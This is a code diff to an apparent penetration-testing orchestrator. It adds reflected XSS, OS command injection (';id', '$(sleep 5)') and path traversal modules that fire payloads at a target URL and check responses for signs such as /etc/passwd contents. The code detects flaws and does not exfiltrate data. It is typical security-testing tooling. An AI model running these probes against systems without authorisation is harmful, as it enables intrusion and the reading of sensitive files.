@@ -3,6 +3,7 @@ from __future__ import annotations
 import json
 import logging
 import os
+import re
 import shutil
 import subprocess
 import threading
@@ -13,10 +14,23 @@ from datetime import datetime
 from enum import Enum
 from pathlib import Path
 from typing import Any, Dict, Iterable, List, Optional, Set
+from urllib.parse import urlencode, urlparse, urlunparse
 
 import httpx
 
 from src.core.events import BaseEvent
+
+
+def _ensure_url(target: str) -> str:
+    if target.startswith(("http://", "https://")):
+        return target
+    return f"http://{target}"
+
+
+def _with_query(url: str, extra: Dict[str, str]) -> str:
+    parsed = urlparse(url)
+    query = urlencode(extra)
+    return urlunparse(parsed._replace(query=query))
 
 
 class AttackExecutionError(RuntimeError):
@@ -32,6 +46,9 @@ class AttackVector(str, Enum):
     SQLI = "sqli"
     METASPLOIT = "metasploit"
     LEGACY_AUDIT = "legacy_audit"
+    XSS_EXPLOIT = "xss_exploit"
+    COMMAND_INJECTION = "command_injection"
+    PATH_TRAVERSAL = "path_traversal"
 
 
 class TestingModel(str, Enum):
@@ -476,6 +493,196 @@ class LegacyAuditModule(BaseAttackModule):
         )
 
 
+class XssExploitModule(BaseAttackModule):
+    module_name = "xss_exploit"
+    description = "Эксплуатация отражённого XSS: инъекция набора payload'ов в параметр и проверка отражения."
+
+    DEFAULT_PAYLOADS = [
+        "<script>alert(document.domain)</script>",
+        "\"><svg onload=alert(document.domain)>",
+        "'><img src=x onerror=alert(document.domain)>",
+        "<svg/onload=alert(String.fromCharCode(88,83,83))>",
+    ]
+
+    def execute(self, context: AttackContext) -> AttackOutcome:
+        url = _ensure_url(context.parameters.get("url") or context.target)
+        param = context.parameters.get("param", "q")
+        payloads = context.parameters.get("payloads") or self.DEFAULT_PAYLOADS
+
+        if context.dry_run:
+            return AttackOutcome(
+                success=True,
+                status="dry_run",
+                module=self.module_name,
+                details=f"Подготовлено {len(payloads)} XSS payload'ов для параметра '{param}'.",
+                artifacts={"url": url, "param": param, "payloads": payloads},
+            )
+
+        confirmed: List[Dict[str, Any]] = []
+        for payload in payloads:
+            probe_url = _with_query(url, {param: payload})
+            try:
+                response = httpx.get(probe_url, timeout=10)
+            except httpx.RequestError:
+                continue
+            if payload in response.text:
+                confirmed.append({"payload": payload, "url": probe_url, "status_code": response.status_code})
+
+        success = bool(confirmed)
+        details = (
+            f"Подтверждено {len(confirmed)} из {len(payloads)} payload'ов для параметра '{param}'."
+            if success
+            else f"Отражённый XSS не подтверждён для параметра '{param}'."
+        )
+
+        return AttackOutcome(
+            success=success,
+            status="completed" if success else "no_findings",
+            module=self.module_name,
+            details=details,
+            artifacts={"url": url, "param": param, "tested": len(payloads)},
+            evidence={"confirmed_payloads": confirmed},
+        )
+
+
+class CommandInjectionModule(BaseAttackModule):
+    module_name = "command_injection"
+    description = "Проверка и эксплуатация ОС command injection через output- и time-based payload'ы."
+
+    OUTPUT_PAYLOADS = [";id", "|id", "`id`", "$(id)", ";whoami", "|whoami"]
+    TIME_PAYLOADS = [";sleep 5", "|sleep 5", "`sleep 5`", "$(sleep 5)"]
+    OUTPUT_PATTERNS = [r"uid=\d+\(\w*\)\s+gid=\d+", r"root:.*:0:0", r"\b(www-data|root|daemon)\b"]
+
+    def execute(self, context: AttackContext) -> AttackOutcome:
+        url = _ensure_url(context.parameters.get("url") or context.target)
+        param = context.parameters.get("param", "cmd")
+        baseline_delay = float(context.parameters.get("baseline_delay", 5.0))
+
+        if context.dry_run:
+            return AttackOutcome(
+                success=True,
+                status="dry_run",
+                module=self.module_name,
+                details=f"Подготовлены payload'ы command injection для параметра '{param}'.",
+                artifacts={
+                    "url": url,
+                    "param": param,
+                    "output_payloads": self.OUTPUT_PAYLOADS,
+                    "time_payloads": self.TIME_PAYLOADS,
+                },
+            )
+
+        confirmed_output: List[Dict[str, Any]] = []
+        for payload in self.OUTPUT_PAYLOADS:
+            probe_url = _with_query(url, {param: payload})
+            try:
+                response = httpx.get(probe_url, timeout=10)
+            except httpx.RequestError:
+                continue
+            for pattern in self.OUTPUT_PATTERNS:
+                if re.search(pattern, response.text):
+                    confirmed_output.append({"payload": payload, "url": probe_url, "pattern": pattern})
+                    break
+
+        confirmed_time: List[Dict[str, Any]] = []
+        for payload in self.TIME_PAYLOADS:
+            probe_url = _with_query(url, {param: payload})
+            start = time.time()
+            try:
+                httpx.get(probe_url, timeout=baseline_delay + 5)
+            except httpx.TimeoutException:
+                confirmed_time.append({"payload": payload, "url": probe_url, "note": "превышен таймаут — возможна инъекция"})
+                continue
+            except httpx.RequestError:
+                continue
+            elapsed = time.time() - start
+            if elapsed >= baseline_delay:
+                confirmed_time.append({"payload": payload, "url": probe_url, "elapsed_seconds": elapsed})
+
+        success = bool(confirmed_output or confirmed_time)
+        details = (
+            f"Найдено {len(confirmed_output)} output-based и {len(confirmed_time)} time-based признаков инъекции."
+            if success
+            else f"Command injection не подтверждена для параметра '{param}'."
+        )
+
+        return AttackOutcome(
+            success=success,
+            status="completed" if success else "no_findings",
+            module=self.module_name,
+            details=details,
+            artifacts={"url": url, "param": param},
+            evidence={"output_based": confirmed_output, "time_based": confirmed_time},
+        )
+
+
+class PathTraversalModule(BaseAttackModule):
+    module_name = "path_traversal"
+    description = "Эксплуатация Path Traversal/LFI: перебор payload'ов для чтения файлов через параметр."
+
+    TRAVERSAL_PREFIXES = ["../", "..\\", "%2e%2e%2f", "..%2f", "....//"]
+    MAX_DEPTH = 6
+    SIGNATURES = {
+        "etc/passwd": r"root:.*:0:0",
+        "win.ini": r"\[fonts\]",
+    }
+
+    def execute(self, context: AttackContext) -> AttackOutcome:
+        url = _ensure_url(context.parameters.get("url") or context.target)
+        param = context.parameters.get("param", "file")
+        target_file = context.parameters.get("file", "etc/passwd")
+        payloads = context.parameters.get("payloads") or self._build_payloads(target_file)
+
+        if context.dry_run:
+            return AttackOutcome(
+                success=True,
+                status="dry_run",
+                module=self.module_name,
+                details=f"Подготовлено {len(payloads)} payload'ов traversal для параметра '{param}' (файл: {target_file}).",
+                artifacts={"url": url, "param": param, "file": target_file, "payloads": payloads[:10]},
+            )
+
+        signature = self._signature_for(target_file)
+        confirmed: List[Dict[str, Any]] = []
+        for payload in payloads:
+            probe_url = _with_query(url, {param: payload})
+            try:
+                response = httpx.get(probe_url, timeout=10)
+            except httpx.RequestError:
+                continue
+            if signature and re.search(signature, response.text):
+                confirmed.append({"payload": payload, "url": probe_url, "status_code": response.status_code})
+
+        success = bool(confirmed)
+        details = (
+            f"Подтверждено чтение файла '{target_file}' через {len(confirmed)} payload'ов."
+            if success
+            else f"Path traversal не подтверждён для файла '{target_file}'."
+        )
+
+        return AttackOutcome(
+            success=success,
+            status="completed" if success else "no_findings",
+            module=self.module_name,
+            details=details,
+            artifacts={"url": url, "param": param, "file": target_file, "tested": len(payloads)},
+            evidence={"confirmed_payloads": confirmed},
+        )
+
+    def _build_payloads(self, target_file: str) -> List[str]:
+        payloads = []
+        for prefix in self.TRAVERSAL_PREFIXES:
+            for depth in range(2, self.MAX_DEPTH + 1):
+                payloads.append(prefix * depth + target_file)
+        return payloads
+
+    def _signature_for(self, target_file: str) -> Optional[str]:
+        for key, signature in self.SIGNATURES.items():
+            if key in target_file.replace("\\", "/"):
+                return signature
+        return None
+
+
 class AttackOrchestrator:
     """Высокоуровневый оркестратор атак Dev B."""
 
@@ -492,12 +699,18 @@ class AttackOrchestrator:
         self.sqli_module = SqlmapModule()
         self.meta_module = MetasploitModule()
         self.legacy_module = LegacyAuditModule(self.vuln_checker)
+        self.xss_module = XssExploitModule()
+        self.cmdi_module = CommandInjectionModule()
+        self.path_traversal_module = PathTraversalModule()
 
         self.modules: Dict[AttackVector, BaseAttackModule] = {
             AttackVector.BRUTE_FORCE: self.brute_module,
             AttackVector.SQLI: self.sqli_module,
             AttackVector.METASPLOIT: self.meta_module,
             AttackVector.LEGACY_AUDIT: self.legacy_module,
+            AttackVector.XSS_EXPLOIT: self.xss_module,
+            AttackVector.COMMAND_INJECTION: self.cmdi_module,
+            AttackVector.PATH_TRAVERSAL: self.path_traversal_module,
         }
 
         self.profiles = self._build_profiles()
@@ -513,6 +726,9 @@ class AttackOrchestrator:
                     AttackVector.BRUTE_FORCE,
                     AttackVector.SQLI,
                     AttackVector.LEGACY_AUDIT,
+                    AttackVector.XSS_EXPLOIT,
+                    AttackVector.COMMAND_INJECTION,
+                    AttackVector.PATH_TRAVERSAL,
                 },
                 max_parallel=2,
                 rate_limit_per_minute=30,
